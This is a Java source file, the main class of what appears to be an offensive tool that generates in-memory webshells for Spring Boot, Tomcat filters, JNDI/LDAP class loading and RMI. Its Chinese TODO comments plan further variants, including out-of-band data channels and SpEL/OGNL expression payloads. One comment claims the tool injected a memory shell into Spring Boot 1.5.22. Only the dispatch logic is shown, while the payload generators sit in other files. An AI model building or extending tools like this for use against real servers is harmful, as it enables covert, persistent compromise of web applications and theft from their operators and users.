package com;

import com.generate.*;
import com.dto.ClassDto;

import java.io.File;
import java.util.HashMap;

/*
todo: registerMapping似乎可以传空？！看看是不是版本问题
* todo: tomcat valve websocket
* todo: 体积最小化
* todo: Tomcat、jetty等
* todo: 可选命令执行或其他
    * 仅calc
    * tcp/udp/icmp通网测试

* todo: JNDI unboundid 改造下能接受外带数据
* todo: spel、ongl、ScriptEngineManager 语句构造
* SpringBoot 用 RegisterHandler方式，实测能打进1.5.22的内存马
* */
public class Main {
    public static String basePath = Main.class.getProtectionDomain().getCodeSource().getLocation().getPath();

    public static void main(String[] args) {
        //Jar包名
        String[] split = basePath.split(File.separator);
        String packageName = split[split.length-1];
        //如果是Jar包
        if (packageName.contains(".jar")){
            basePath = basePath.replace(packageName, "");
            basePath = basePath + "jars";
        }else{
            basePath = basePath + "/jars";
        }

        if (!Usage.parseUserArgs(args)) {
            Usage.printUsage();
            return;
        }
        /*
            url
            commandArg
            header
            headerValue
            serverMode
            encode
        * */
        String mode = Usage.getArg("mode");
        String url = Usage.getArg("url");
        String cmd = Usage.getArg("commandArg");
        String header = Usage.getArg("header");
        String headerValue = Usage.getArg("headerValue");
        String encode = Usage.getArg("encode");
        String httpServerIp = Usage.getArg("httpServerIp");
        Integer httpServerPort = Usage.getArg("httpServerPort") == null ? 0 : Integer.parseInt(Usage.getArg("httpServerPort"));
        Integer jndiServerPort = Usage.getArg("jndiServerPort") == null ? 0 : Integer.parseInt(Usage.getArg("jndiServerPort"));
        String webPath = Usage.getArg("webPath");
        String rmiExObjPort = Usage.getArg("rmiExObjPort");

        HashMap<String, String> inputArgs = Usage.getArgs();
        ClassDto classDto = null;
        try {
            switch (mode){
                case "SpringBoot.registerHandler":
                    classDto = SpringMvc.SpringRegisterHandler(url, cmd, header, headerValue);
                    break;
                case "SpringBoot.registerMapping":
                    classDto = SpringMvc.springRegisterMapping(url, cmd, header, headerValue);
                    break;
                case "Tomcat.6789.Filter":
                    classDto = Tomcat.tomcatFilter(url, cmd, header, headerValue, "6789");
                    break;
                case "Tomcat.89.Filter":
                    classDto = Tomcat.tomcatFilter(url, cmd, header, headerValue, "89");
                    break;
                case "Jndi.Ldap.URLClassLoader":
                    Jndi.ldapBase(inputArgs);
                    return;
                case "Rmi.Echo":
                    classDto = RmiBind.bind(rmiExObjPort);
                    break;
                case "Jetty":
                    break;
                case "WebLogic":
                    break;
                default:
                    System.out.println("[-] Unknown serverMode");
                    Usage.printUsage();
                    break;
            }
            PostGenerate.dispatch(classDto, encode, inputArgs);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
